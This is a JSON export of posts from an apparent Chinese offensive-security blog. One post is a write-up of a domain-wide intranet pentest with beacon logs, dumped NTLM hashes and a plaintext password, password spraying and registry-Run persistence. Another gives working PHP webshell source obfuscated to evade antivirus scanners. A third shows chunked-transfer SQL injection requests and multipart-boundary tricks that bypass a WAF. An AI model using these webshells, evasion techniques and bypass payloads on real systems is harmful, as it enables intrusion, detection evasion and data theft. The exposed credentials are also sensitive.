[{"id":"0bd76f5e05f20e2c9f8c34af03f6d8cf","title":"images","content":"","slug":"images","date":"2023-05-24T15:06:49.000Z","categories_index":"","tags_index":"","author_index":"Q16G"},{"id":"d18f6cf7ec850f9424c2daedf3d5426a","title":"test2","content":"\n","slug":"test2","date":"2023-05-24T04:42:45.000Z","categories_index":"","tags_index":"","author_index":"Q16G"},{"id":"a8369a7e0cad3c04c73a08db66b17b13","title":"关于内网excahnge的漏洞总结","content":"前言介绍 NTLM认证分为本地认证和网络认证，当我们开机登陆用户账号的时候，就需要将lsass中的密码转换为明文hash与sam文件中进行对比，这种方式就是本地认证。\n而当我们访问局域网中的一台主机的SMB共享的时候，需要提供凭证才能进行访问，这个过程就是网络认证。\nNTLM协议介绍NTLM协议分为几个部分。 协商、挑战、认证。也叫做挑战响应机制。\n协商：这个是为了解决历史遗留问题，为了向下兼容设计，双方协定一下传输的版本号等各种信息，版本主要分为V1和V2两个版本。\n挑战：如下图。\n认证：对质问结果的验证，验证通过后即可访问资源。\n\n\n","slug":"关于内网excahnge的漏洞总结","date":"2023-05-24T04:12:28.000Z","categories_index":"","tags_index":"内网渗透","author_index":"Q16G"},{"id":"6926437034a0cc884741b3438fbe3704","title":"关于某次授权的大型内网渗透测试","content":"接到朋友邀请，要对一个站点进行全面渗透，内网发现多DC主机，遂记录。\n背景：接到朋友邀请，要进行一个授权站点的渗透，但是进去实际环境才发现是多域控主机。也学习了很多后渗透手法，比较受益匪浅。\n前期渗透：打点：（任意文件上传）直接发现头像处任意文件上传，这里直接上传冰蝎即可。\n\n\ntasklist查看杀软System Idle Process              0 N/A                                         \nSystem                           4 N/A                                         \nsmss.exe                       240 N/A                                         \ncsrss.exe                      376 N/A                                         \nwininit.exe                    436 N/A                                         \nservices.exe                   524 N/A                                         \nlsass.exe                      532 Kdc, KeyIso, Netlogon, NTDS, SamSs          \nsvchost.exe                    672 BrokerInfrastructure, DcomLaunch, LSM,      \n                                   PlugPlay, Power, SystemEventsBroker         \nsvchost.exe                    716 RpcEptMapper, RpcSs                         \nWRSA.exe                       820 WRSVC                                       \nsvchost.exe                    276 Dhcp, EventLog, lmhosts, Wcmsvc             \nsvchost.exe                    320 Appinfo, BITS, CertPropSvc, gpsvc, IAS,     \n                                   IKEEXT, iphlpsvc, LanmanServer, ProfSvc,    \n                                   Schedule, seclogon, SENS, SessionEnv,       \n                                   ShellHWDetection, Themes, Winmgmt           \nsvchost.exe                    516 EventSystem, FontCache, netprofm, nsi,      \n                                   W32Time, WinHttpAutoProxySvc                \nsvchost.exe                    932 CryptSvc, Dnscache, LanmanWorkstation,      \n                                   NlaSvc, WinRM                               \nsvchost.exe                   1100 BFE, DPS, MpsSvc                            \nspoolsv.exe                   1508 Spooler                                     \nMicrosoft.ActiveDirectory     1540 ADWS                                        \nOfficeClickToRun.exe          1792 ClickToRunSvc                               \nsvchost.exe                   1844 ddpvssvc                                    \ndfsrs.exe                     1892 DFSR                                        \nsvchost.exe                   1908 DHCPServer                                  \nsvchost.exe                   1936 DiagTrack                                   \ndns.exe                       1980 DNS                                         \nfmaonsite.exe                 2024 FMAuditOnsite                               \nismserv.exe                   1340 IsmServ                                     \nMicrosoft.BDD.MonitorServ     1432 MDT_Monitor                                 \nMSOIDSVC.EXE                  2660 msoidsvc                                    \nsvchost.exe                   2328 Net Driver HPZ12                            \nOpenDNSAuditService.exe       2220 OpenDNS Active Directory Service            \nMSOIDSVCM.EXE                 1256 N/A                                         \nsvchost.exe                   2172 Pml Driver HPZ12                   \nScreenConnect.ClientServi      556 ScreenConnect Client (62c0d7e1d3b94bc5)     \nsvchost.exe                   1472 TermService                                 \nOpenDNSAuditClient.exe        2924 N/A                                         \nconhost.exe                   1380 N/A                                         \nVGAuthService.exe             2096 VGAuthService                               \nvmtoolsd.exe                   612 VMTools                                     \nWRCoreService.x64.exe         2136 WRCoreService                               \nWRSkyClient.x64.exe           3180 WRSkyClient                                 \ndfssvc.exe                    3316 Dfs                                         \nWmiPrvSE.exe                  3484 N/A                                         \nsvchost.exe                   3568 UALSVC, UmRdpService                        \nVeeamDeploymentSvc.exe        3612 VeeamDeploySvc                              \nWRSvcMetrics.x64.exe          3580 N/A                                         \nsvchost.exe                   4216 PolicyAgent                                 \nmsdtc.exe                     4160 MSDTC                                       \nDCA.Edge.Console.exe          3676 DCAPulse                                    \niashost.exe                   4548 N/A                                         \nwsmprovhost.exe               9104 N/A                                         \npowershell.exe                7828 N/A                                         \nconhost.exe                   6688 N/A                                         \npowershell.exe                 360 N/A                                         \nconhost.exe                   5152 N/A                                         \nnotepad.exe                   1760 N/A                                         \nLTSvcMon.exe                  5424 LTSvcMon                                    \nLTSVC.exe                     7272 LTService                                   \nlabvnc.exe                    5412 tvnserver                                   \nVeeam.EndPoint.Service.ex     8316 VeeamEndpointBackupSvc                      \nwsmprovhost.exe               7108 N/A                                         \nScreenConnect.WindowsBack     4384 N/A                                         \ncsrss.exe                     7564 N/A                                         \nwinlogon.exe                  5520 N/A                                         \ndwm.exe                       6572 N/A                                         \nlabvnc.exe                    5916 N/A                                         \ntaskhostex.exe                8540 N/A                                         \nWRSA.exe                      2308 N/A                                         \nScreenConnect.WindowsClie     3732 N/A                                         \nexplorer.exe                  3964 N/A                                         \nMRT.exe                       4852 N/A                                         \nvm3dservice.exe               2656 N/A                                         \nMRT.exe                       5196 N/A                                         \nvmtoolsd.exe                  5340 N/A                                         \nDCA.Edge.TrayIcon.exe         6432 N/A                                         \nLTTray.exe                    4564 N/A                                         \nWmiPrvSE.exe                  6336 N/A                                         \nTaskmgr.exe                   6684 N/A                                         \nLogonUI.exe                    380 N/A                                         \ncmd.exe                       2400 N/A                                         \nconhost.exe                   6216 N/A                                         \nnet.exe                       8100 N/A                                         \nnet1.exe                      8908 N/A                                         \ncmd.exe                       2956 N/A                                         \nconhost.exe                   8300 N/A                                         \nnet.exe                       7344 N/A                                         \nnet1.exe                      5248 N/A                                         \ncmd.exe                        432 N/A                                         \nconhost.exe                   9052 N/A                                         \nnet.exe                       7356 N/A                                         \nnet1.exe                      3156 N/A                                         \ncmd.exe                       8232 N/A                                         \nconhost.exe                   4600 N/A                                         \nnet.exe                       5528 N/A                                         \nnet1.exe                      7352 N/A                                         \ncmd.exe                       4304 N/A                                         \nconhost.exe                   7148 N/A                                         \nvds.exe                       3872 vds                                         \ncmd.exe                       7716 N/A                                         \nconhost.exe                   8564 N/A                                         \ntasklist.exe                  9212 N/A   \n\n\n内网渗透：边缘机的systeminfo因为前期拿到了边缘机，这里查看systeminfo,发现是2012R2的主机。\n\n边缘机提权：（利用烂土豆直接提上权限）提权之后做进程迁移，直接把进程迁移到lsass进程中去。\n\n内网信息收集：先查看ip，看是否存在双网卡机Windows IP Configuration\n\n   Host Name . . . . . . . . . . . . : CAMS-SQL3\n   Primary Dns Suffix  . . . . . . . : AVV.org\n   Node Type . . . . . . . . . . . . : Hybrid\n   IP Routing Enabled. . . . . . . . : No\n   WINS Proxy Enabled. . . . . . . . : No\n   DNS Suffix Search List. . . . . . : AVV.org\n\nEthernet adapter Ethernet:\n\n   Connection-specific DNS Suffix  . : \n   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter\n   Physical Address. . . . . . . . . : 00-50-56-98-E3-D6\n   DHCP Enabled. . . . . . . . . . . : No\n   Autoconfiguration Enabled . . . . : Yes\n   Link-local IPv6 Address . . . . . : fe80::a5b1:d534:730:3123%11(Preferred) \n   IPv4 Address. . . . . . . . . . . : 10.2.0.49(Preferred) \n   Subnet Mask . . . . . . . . . . . : 255.255.254.0\n\n进行域管理员和域控的查看：域控：net group “domain controllers” &#x2F;domain\n[04/26 18:16:59] beacon> shell net group \"domain Controllers\" /domain\n[04/26 18:17:00] [*] Tasked beacon to run: net group \"domain Controllers\" /domain\n[04/26 18:17:00] [+] host called home, sent: 69 bytes\n[04/26 18:17:00] [+] received output:\nThe request will be processed at a domain controller for domain FPC.LOCAL.\n\nGroup name     Domain Controllers\nComment        All domain controllers in the domain\n\nMembers\n\n-------------------------------------------------------------------------------\nAVV-DC1$                 AVV-DC2$                 AVV-DHDC01$              \nAVV-DHDC02$                    \n\n域管：net group “domain admins” &#x2F;domain\nfpcadmin                 mqd.ns          \nmqd.rmm                  mqd.tdv  \n\n前直接归属的域控和主域控：net time &#x2F;domain\n[04/26 18:27:52] beacon> shell net time /domain\n[04/26 18:27:52] [*] Tasked beacon to run: net time /domain\n[04/26 18:27:52] [+] host called home, sent: 47 bytes\n[04/26 18:27:54] [+] received output:\nCurrent time at \\\\AVV-DC2.FPC.LOCAL is 4/26/2023 5:27:53 AM\n\n可以发现当前是直接被DC2所归属，这里查下主控制器。这里直接使用CS插件来进行渗透\n[04/26 18:31:11] [+] =========== 查看主域控制器 ==========\n[04/26 18:31:12] [*] Tasked beacon to run: netdom query pdc\n[04/26 18:31:12] [+] host called home, sent: 47 bytes\n[04/26 18:31:14] [+] received output:\nPrimary domain controller for the domain:\n\nAVV-DC1\nThe command completed successfully.\n\n定位域控的IP地址：这里经过ping之后发现，域控不是都在同一个网段，应该是如下的结构。\n\n内网存活主机探测：我先进行了DC段和本机段存活主机的探测，这里直接利用cs的插件（portscan）\nportscan 10.2.0.0/24\nportscan 10.2.92.30/24\nportscan 10.6.0.10/24\nportscan 10.11.1.12/24\n\n\nfscan扫描本机C段：潦草的扫描到了ftp的匿名登陆，没有扫描到其他有用信息。这里就不放其他几个段的截图，都没扫描到啥有用的信息。\n\n做hashdump：这里直接做完hashdump之后发现\nmsv :   \n     [00000003] Primary\n     * Username : mqd.tdv \n     * Domain   : FPC\n     * NTLM     : 7007ebae678042f1cf112578ac43bf68\n     * SHA1     : 712ce4bf3a4a777582389d37f8d06158ed204f6b\n    tspkg : \n    wdigest :   \n     * Username : mqd.tdv \n     * Domain   : FPC\n     * Password : QWE123456QE!@#\n    kerberos :  \n     * Username : mts.tdv\n     * Domain   : FPC\n     * Password : QWE123456QE!@#\n    ssp :   \n    credman :   \n\n内网横向（因为自己失误造成了比较繁琐的过程）因为前期已经看到了域管的账号就是mqd.tdv，这里直接做密码喷洒，这里转到msf中看下。上线了如此多的主机，同时，DC2子域控也进行了上线\n第一天上线的主机：(MSF上)\nCS上：（上线74台）\n小插曲：因为渗透到域控的时候，在半夜2点半，所以在拿到DC2的权限的时候，就直接关掉电脑睡觉啦，没有进行留后门和做进程注入，导致第二天上线的时候执行命令出现如下界面。\n这里的意思就是启动新进程的时候，系统无法将当前进程的令牌传递给新进程。也就是无法创建进程，所以只能通过其他方式来进行横向渗透。并且后期发现该域管理员密码已经进行修改。\nDC挂掉之后的想到的几种方式：（1）抓去已控主机的hash看是否有其他域管登陆（失败）因为前面已经拿到了100多台机子的权限，所以能想到的第一个思路就是把100多台主机上的hash都进行一个抓起取，然后看是否可以抓到域管的账号，但是这里抓完之后会发现，没有一台域管是上线的，所以这里也比较无语。\n\n（2）利用CVE漏洞来进行横向（失败）因为之前探测到DC的版本是windows2012 R2版本，所以想到了用ms17-010来进行内网横向，但是这里经过检测之后发现也没有ms17-010的漏洞，所以无法进行横向\n\n（3）利用CVE漏洞来子域控（CVE-2020-1472）（失败）这里经过尝试CVE-2020-1472漏洞，也没有发现可以横向上去，通过poc检测发现是fail的。\n\n（4）尝试攻击exchange服务器，来中继攻陷主机（失败）这里就不放细节了，均以失败告终。\n峰回路转：（DC2子域控上线）DC2子域控上线过程：这里经过一天的折磨之后发现，以上的几种方式不好使，但是想到了抓取机器用户的hash，通过构造密码表，来进行域管的密码喷洒，这里抓取了100多个的机器用户和几个域内用户做成密码表，重新进行内网横向。\n这里截图部分域内用户，做成密码表后直接进行喷洒，发现域管成功上线。\n\n\n\nDC2子域权限维持：（1）把当前进程注入到lsass进程中去。\n（2）reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"start\" /d \"C:\\Windows\\Temp\\start.exe\"  //开机自启动\n（3）添加域管理员，因为已经拿到域管理员的权限，所以可以添加域管理员，来进行权限维持（这里直接通过lstar的插件来进行域管理员的添加）\n\n其他域控上线这里也是一个小Tip，也是提供给大家的一个思路\n在有权限的情况下，可以添加域管理员，然后通过域管理员来进行横向其他域控（这是仅限于一个域），但是上面给出来了结构，这个域都是在一个域内的，所以的话，就可以进行添加管理员来上线。这里直接放后期上线的域控。\n\n总结：经过这次实战总结了很多小的技巧。\n（1）可以通过添加域管理员来上线域内的所有主机\n（2）可以通过cs来进行进程注入or进程迁移，来实现本机system权限的获取\n（3）此次实战的密码喷洒尤为重要，所以有机器用户的hash一定要进行抓取\n（4）SPN服务横向可以通过打邮服来进行获取域控权限\n（5）学习了权限维持的方法（开机自启动、winrm的横向和psexec的横向）\n\n恶补了一大波内网知识（比靶场来的实在）\n\n不足之处：\n（1）此次通过内网渗透，虽然打了邮件服务器，但是没有通过邮件服务器来拿下DC的权限。\n（2）没有通过SPN票据横向拿下对应的服务器，比如MSSQL的和CIFS的\n（3）此次没有利用白银票据进行横向（得重新学习）\n","slug":"关于某次授权的大型内网渗透测试","date":"2023-05-24T02:43:26.000Z","categories_index":"","tags_index":"内网渗透","author_index":"Q16G"},{"id":"0bde8e350134ac3c0961afd29aadf7f8","title":"phpwebshell免杀","content":"AntSword0x00 前言：为什么会有改造蚁剑的想法，之前看到有做冰蝎的流量加密，来看到绕过waf，改造一些弱特征，通过流量转换，跳过密钥交互。但是，冰蝎需要反编译去改造源码，再进行修复bug，也比较复杂。而AntSword相对于冰蝎来说，不限制webshell，即一句话也可以进行连接，还可以自定义编码器和解码器，可以很容易让流量做到混淆。\n0x01 蚁剑介绍及其改编：关于蚁剑的介绍，这里就不多说了，一个连接webshell的管理器，使用前端nodejs进行编码。AntSword给我最大的好处是可以连接一句话木马，而且可以自定义编码器和解码器。这让我们就有了很多种webshell的变换。\n但是，蚁剑默认的编码器和菜刀都是一样的，这里用burpsuite来进行抓包看下流量。\n蚁剑默认流量返回来的是默认蚁剑的默认流量，所以的话，这里就基本上过不去态势感知和waf，所以很容易想到了编码器和解码器的选择，可以进行流量的改造来进行waf的绕过，先选用最默认的base64进行测试。\n默认的base64编码器但是看到了使用base64编码之后是有eval字样的，这样的话，肯定被态势感知和全流量一体机来进行特征的抓取，肯定会报威胁。\n去github上找到蚁剑的编码器和对应的解码器github地址:（编码器）这里下载默认的aes-128的默认流量。\n默认编码器的webshell\n&lt;?php\n@session_start();\n$pwd='ant';\n$key=@substr(str_pad(session_id(),16,'a'),0,16);\n@eval(openssl_decrypt(base64_decode($_POST[$pwd]), 'AES-128-ECB', $key, OPENSSL_RAW_DATA|OPENSSL_ZERO_PADDING));\n?>\n\n默认webshell讲解：这里打开session_start，然后截取Cookie中的PHPSESSION的16位。\n然后进行aes加密，密码为pwd\n\n再D盾，河马和阿里云进行扫描：\n河马没有查出来，可能是比较弱阿里云直接报恶意\n\n初步修改后的webshell：&lt;?php\n@session_start();\nerror_reporting(E_ALL^E_NOTICE^E_WARNING);\nfunction decode($key,$data)&#123;\n$data_new = '';\nfor($i=0;$i&lt;=strlen($data);$i++)&#123;\n$b=$data[$i]^$key;\n$data_new = $data_new.urldecode($b);\n&#125;\ndefine('ass',$data_new[0].strrev($data_new)[2].strrev($data_new)[2].$data_new[11].strrev($data_new)[4].strrev($data_new)[0]);\ndefine('ev',$data_new[11].strrev($data_new)[8].$data_new[0].strrev($data_new)[6].'($result)');\nreturn $data_new;\n&#125;\nfunction decrypto($key,$data)&#123;\n$data = base64_decode($data);\n$result = openssl_decrypt($data, 'AES-128-ECB', $key, OPENSSL_RAW_DATA|OPENSSL_ZERO_PADDING);\ndecode('\\\\','=:=om>n?o8h9i:j;k*d0e.l/m(');\n$ass=ass;\n$ass(ev);\n&#125;\nclass run&#123;\n    public $data;\n    public function __construct()&#123;\n$this->data = '#````````#'.$_POST[1].\"#`#`#\";\n$this->data = $this->data.\"123456\";\n&#125;\n&#125;\n$key=@substr(str_pad(session_id(),16,'a'),0,16);\n$run = new run();\ndecrypto($key,$run->data);\n?>\n\n这里能过去D盾，但是无法绕过阿里云查杀。\n所以这里还需要进行代码混淆。（这也是之后webshell免杀常常用到的）\n混淆之后的webshell：这里提供php在线加密的站\nhttps://enphp.djunny.com/\n\n这里加密之后生成webshell。如下：\ngoto Zc4oD; UJih6: function decrypto($key, $data) &#123; goto LBrqg; P6YrI: $ass = ass; goto aR6yN; svn0O: $result = openssl_decrypt($data, \"\\x41\\x45\\x53\\x2d\\x31\\x32\\70\\55\\105\\x43\\x42\", $key, OPENSSL_RAW_DATA | OPENSSL_ZERO_PADDING); goto ATbMy; LBrqg: $data = base64_decode($data); goto svn0O; ATbMy: decode(\"\\x5c\", \"\\75\\72\\x3d\\157\\x6d\\x3e\\x6e\\x3f\\x6f\\x38\\x68\\71\\151\\x3a\\x6a\\x3b\\x6b\\x2a\\x64\\x30\\x65\\56\\x6c\\57\\155\\50\"); goto P6YrI; aR6yN: $ass(ev); goto k6RVH; k6RVH: &#125; goto DGZMG; WvjFi: ini_set(\"\\144\\151\\x73\\160\\x6c\\x61\\x79\\x5f\\145\\162\\x72\\x6f\\162\\x73\", \"\\117\\146\\x66\"); goto Wguwk; DGZMG: class run &#123; public $data; public function __construct() &#123; $this->data = \"\\43\\140\\x60\\140\\140\\x60\\140\\x60\\x60\\43\" . $_POST[1] . \"\\x23\\140\\x23\\140\\43\"; &#125; &#125; goto Berxy; UUYvT: $run = new run(); goto apKNY; Berxy: $key = @substr(str_pad(session_id(), 16, \"\\141\"), 0, 16); goto UUYvT; Zc4oD: @session_start(); goto WvjFi; Wguwk: function decode($key, $data) &#123; goto LGJR3; Ef77S: $i = 0; goto KvZGg; rSTXM: define(\"\\141\\x73\\x73\", $data_new[0] . strrev($data_new)[2] . strrev($data_new)[2] . $data_new[11] . strrev($data_new)[4] . strrev($data_new)[0]); goto TQ6r4; Tbglr: return $data_new; goto FsE2S; tm2qt: goto I39OV; goto eF7jG; AqTZZ: $data_new = $data_new . urldecode($b); goto FriN_; TQ6r4: define(\"\\x65\\166\", $data_new[11] . strrev($data_new)[8] . $data_new[0] . strrev($data_new)[6] . \"\\50\\x24\\x72\\145\\163\\165\\154\\x74\\51\"); goto Tbglr; FriN_: bLexq: goto gITff; eF7jG: RuTl1: goto rSTXM; gITff: $i++; goto tm2qt; KdSCg: if (!($i &lt;= strlen($data))) &#123; goto RuTl1; &#125; goto d9N4J; d9N4J: $b = $data[$i] ^ $key; goto AqTZZ; LGJR3: $data_new = ''; goto Ef77S; KvZGg: I39OV: goto KdSCg; FsE2S: &#125; goto UJih6; apKNY: decrypto($key, $run->data);\n\n经过加密之后，可以发现，进行了goto的混淆，所以这里就达到了代码混淆。因为之前绕过了D盾和河马，这里直接去阿里云查杀。\n已经成功绕过阿里云查杀。用burpsuite抓下流量特征。\n从流量加密来分析的话，已经能绕过态势感知和全流量分析机。\n蚁剑UA头的修改：在burp的数据包中能清楚的看到蚁剑的特征\n在目录&#x2F;modules&#x2F;request.js文件中修改UA头\n&#x2F;modules&#x2F;update.js文件修改\n0x03 总结：关于免杀来说，通常是进行代码加密混淆，特征码替换或者分割传输等情况。之前有想写过shellcode免杀，但是还没有过windows defender，所以就推迟一段时间来写。感谢各位拜读。\n","slug":"phpwebshell免杀","date":"2023-05-24T02:40:14.000Z","categories_index":"","tags_index":"免杀","author_index":"Q16G"},{"id":"cf78fa225b6de7abf9eac61bd71ce650","title":"waf绕过-打狗棒法","content":"0x01 前言某狗可谓是比较好绕过的waf，但是随着现在的发展，某狗也是越来越难绕过了，但是也不是毫无办法，争取这篇文章给正在学习waf绕过的小白来入门一种另类的waf绕过。\n某狗可谓是比较好绕过的waf，但是随着现在的发展，某狗也是越来越难绕过了，但是也不是毫无办法，争取这篇文章给正在学习waf绕过的小白来入门一种另类的waf绕过。\n\n环境的搭建：环境的搭建就选择phpstudy2018+安全狗最新版(2022年10月23日前)\nTip：\n  （1）记得先在phpstudy的Apache的bin目录下初始化Apache服务，一般来说，第一次为询问是否确认，第二次为确认安装（命令：httpd.exe -k install -n apache2.4  用管理员打开）\n  （2）上传防护中把完整的post包过滤勾选上。\n\n0x02 HTTP补充：分块传输的介绍：分块传输编码是超文本传输协议（HTTP）中的一种数据传输机制，允许HTTP由应用服务器向客户端发送的数据分成多个部分，在消息头中指定 Transfer-Encoding: chunked 就表示整个response将使分块传输编译来传输内容。一个消息块由n块组成，并在最后一个大小为0的块结束。\n请求头Transfer-encoding：官方文档:\n告知接收方为了可靠地传输报文，已经对其进行了何种编码。\n\nchunked编码，使用若干个chunk串连接而成，由一个标明长度为0的chunk表示解释，每个chunk分为头部和正文两部分，头部内容定义了下一行传输内容的个数（个数用16进制来进行表示）和数量（一般不写数量，但是为了混淆，这里还是把数量写上去）正文部分就是指定长度的实际内容。两部分之间用(CRLF)来隔开，在最后一个长度为0的chunk中表示结束。并且长度中是以;作为长度的结束\n数据包中添加：Transfer-Encoding: chunked\n数字代表下一行的字符所占位数，最后需要用0独占一行表示结束，结尾需要两个回车\n\n当设置这个Transfer-Encoding请求头的时候，会有两个效果：\nContent-length字段自动忽略\n基于长久化持续推送动态内容（不太了解，但是第三感觉有研究内容）\n\n\nHTTP持久化连接：因为现在大多数是http1.1协议版本，所以的话，只在Transfer-Encoding中定义了chunked一种编码格式。\n持久化连接：\n  Http请求是运行在TCP连接上的，所以自然有TCP的三次握手和四次挥手，慢启动的问题，所以为了提高http的性能，就使用了持久化连接。持久化连接在《计算机网络》中有提及。\n\n  在Http1.1的版本中规定了所有连接默认都是持久化连接，除非在请求头上加上Connection：close。来关闭持久化连接。\n\nContent-Type介绍：Content-Type：互联网媒体类型， 也叫MIME类型，在HTTP的协议消息头中，使用Content-Type来表示请求和响应中的媒体数据格式标签，用于区分数据类型。常见Content-Type的格式如下：\nContent-Type: text/html;\nContent-Type: application/json;charset:utf-8;\nContent-Type：type/subtype ;parameter\nContent-Type：application/x-www-form-urlencoded\nContent-Type：multipart/form-data\n\n重点介绍multipart&#x2F;form-data：当服务器使用multipart&#x2F;form-data接收POST请求的时候，服务器如何知道开始位置和结束位置的呢？？？其中就是用了boundary边界来进行操作的。\nwaf绕过的思路：正常传输的payload都是可以被waf的正则匹配到的，而进行分块传输之后的payload，waf的正则不会进行匹配，而又满足http的规则，所以就能绕过waf。\n例如：正常传输过程中是这样的。那分块传输之后，就变成了这样。\nPOST /sqli-labs-master/Less-11/ HTTP/1.1\nHost: 192.168.172.161\nContent-Length: 128\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: http://192.168.172.161\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nReferer: http://192.168.172.161/sqli-labs-master/Less-11/\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\nTransfer-Encoding: chunked\n\n4\nunam\n1\ne\n1\n=\n4\nadmi\n1\nn\n1\n&amp;\n4\npass\n2\nwd\n1\n=\n4\nadmi\n1\nn\n1\n&amp;\n4\nsubm\n2\nit\n1\n=\n4\nSubm\n2\nit\n0\n\n\n说明是可以识别分块传输的东西，那么我们就可以构造payload来看是否可以绕过waf。\n绕过安全狗的sql注入：这里先解决一下绕过安全狗的方式，在常见的方式中，我们都采用垃圾字符填充的方式来绕过安全狗，虽然效果很好，但是较为复杂，也容易出现被狗咬伤的情况，所以为了解决这一现状，小秦同学翻阅之后发现了分块传输的方式来绕过安全狗。但是分块传输目前来看只能适用于post请求。get请求还是比较难说。\n以sql-labs为例：在sqli-labs的第十一关，我们发现了可以用post请求。先正常看看过滤哪些字符，这里开门见山，直接把’union select (database()),2#。这个东西进行了过滤咱们可以尝试使用分块传输的方式来进行绕过。这里在请求头中添加。\nTransfer-Encoding: chunked\n这个东西，然后进行分块即可。\n\n读取数据库名POST /sqli-labs-master/Less-11/ HTTP/1.1\nHost: 192.168.172.161\nContent-Length: 251\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: http://192.168.172.161\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nReferer: http://192.168.172.161/sqli-labs-master/Less-11/\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\nTransfer-Encoding: chunked\n\n1\nu\n4\nname\n1\n=\n1\n&amp;\n2\npa\n4\nsswd\n1\n=\n3\n%27\n2\nun\n1\ni\n2\non\n1\n+\n2\nse\n1\nl\n2\nec\n1\nt\n1\n+\n3\n%28\n2\nda\n1\nt\n2\nab\n1\na\n2\nse\n3\n%28\n3\n%29\n3\n%29\n3\n%2C\n1\n2\n3\n%23\n1\n&amp;\n3\nsub\n3\nmit\n1\n=\n3\nSub\n3\nmit\n0\n\n\n读取表名：POST /sqli-labs-master/Less-11/ HTTP/1.1\nHost: 192.168.172.161\nContent-Length: 619\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: http://192.168.172.161\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nReferer: http://192.168.172.161/sqli-labs-master/Less-11/\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\nTransfer-Encoding: chunked\n\n1\nu\n2\nna\n1\nm\n1\ne\n1\n=\n1\n&amp;\n2\npa\n2\nss\n2\nwd\n1\n=\n3\n%27\n1\nu\n2\nni\n1\no\n1\nn\n1\n+\n2\nse\n2\nle\n1\nc\n1\nt\n1\n+\n3\n%28\n2\nse\n1\nl\n1\ne\n2\nct\n1\n+\n2\ngr\n2\nou\n1\np\n1\n_\n2\nco\n2\nnc\n2\nat\n3\n%28\n2\nta\n2\nbl\n1\ne\n1\n_\n2\nna\n2\nme\n3\n%29\n1\n+\n2\nfr\n2\nom\n1\n+\n2\nin\n2\nfo\n1\nr\n3\nmat\n2\nio\n1\nn\n1\n_\n2\nsc\n3\nhem\n1\na\n1\n.\n2\nta\n2\nbl\n2\nes\n1\n+\n2\nwh\n2\ner\n1\ne\n1\n+\n2\nta\n2\nbl\n1\ne\n1\n_\n2\nsc\n2\nhe\n1\nm\n1\na\n3\n%3D\n2\nda\n1\nt\n2\nab\n3\nase\n3\n%28\n3\n%29\n3\n%29\n3\n%2C\n1\n2\n3\n%23\n1\n&amp;\n2\nsu\n3\nbmi\n1\nt\n1\n=\n2\nSu\n4\nbmit\n0\n\n\n读列名：\n读取数据：\n绕过安全狗的文件上传（以pikachu靶场为例这里上面讲到了分块传输，这里直接先使用分块传输来进行绕过。这里讲下计算方式，因为文件上传不像sql注入那样单行，所以文件上传是会有回车和空格的计算，（一个回车和一个空格占两个字符）。例如下图：红框中的部分，分别处于不同的行，所以需要传入回车，所以这部分就应该是：这块先去上传php文件为例，可以进行分块传输的构造。然后上传。发现单单的分块传输已经不能绕过安全狗文件上传的检测了。\nContent-Type中的boundary边界混淆绕过因为上面讲到了Content-Type类型，那么对于我们来说，文件上传一定是利用了Content-Type中的multipart&#x2F;form-data来进行的文件上传操作，刚才讲到了利用multipart&#x2F;form-data必须用boundary边界来进行限制，那么我们这里研究一下boundary边界的一些问题。\n深入研究boundary边界问题：这里拿上面的边界来做文章，这里看到了，当上面定义了boundary&#x3D;—-WFJAFAOKAJNFKLAJ的时候我想到了两个问题。\n1.如果有两个boundary是取前一个还是后一个？\n2.boundary结束标志必须和定义的一定相同嘛？\n\n下面继续一一测试\n\nboundary边界问题fuzz：boundary边界一致：\nboundary结束标志不一致：\nboundary开始标志不一致：上面经过研究可以发现boundary结束标志不影响判断。\n多个boundary：\n所以当定义两个boundary的时候，只有第一个起作用。经过了上面的测试发现，我们可以通过构造多个boundary和修改boundary结束标志来达到混淆的效果，这里进行测试。\n多个boundary混淆：这里进入uploads&#x2F;1.php查看\n成功绕过waf。\n发现：这里发现，其他不用非得加boundary混淆，测到boundary后面加分号就直接可以绕过安全狗来上传成功。\n对于分块传输的小Tip：(1)分块传输的每个长度以;结尾，所以可以构造1;fjaojafjao这种来干扰waf\n(2)分块传输的时候是不会管Content-Length的长度，所以可以通过Content-Length的长度变换来绕过某些waf\n(3)分块传输只是适用于post请求，这也是存在的弊端问题\n\n总结：绕过waf的方式多种多样，但是越简单的方式越需要底层的探索，所以底层的学习是非常必要的。希望给正在学习绕waf的小伙伴提供一些思路。而不仅限于垃圾字符填充。\n参考文献：https://zhuanlan.zhihu.com/p/465948117\nhttp://t.zoukankan.com/liujizhou-p-11802189.html\nhttps://copyfuture.com/blogs-details/202203261638435585\n\n","slug":"waf绕过-打狗棒法","date":"2023-05-24T02:37:22.000Z","categories_index":"","tags_index":"waf绕过","author_index":"Q16G"}]